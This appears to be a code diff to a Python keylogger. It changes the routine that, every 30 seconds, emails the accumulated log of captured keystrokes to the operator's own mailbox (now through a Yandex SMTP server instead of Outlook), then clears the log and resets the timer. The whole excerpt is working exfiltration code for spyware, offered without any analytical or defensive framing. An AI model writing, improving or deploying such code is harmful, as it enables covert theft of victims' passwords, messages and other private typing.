@@ -15,15 +15,16 @@ def callback_function(key):
     except:
         pass
 
-def send_email():
-    email_server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
+def send_email(email,password,text):
+    email_server = smtplib.SMTP(host='smtp.yandex.com', port=587)
     email_server.starttls()
-    email_server.login("@hotmail.com","password")
-    email_server.sendmail("@hotmail.com","@hotmail.com",log.encode('utf-8'))
+    email_server.login(email,password)
+    email_server.sendmail(email,email,text)
     email_server.quit()
 
 def thread_function():
-    send_email()
+    global log
+    send_email("","",log.encode('utf-8'))
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
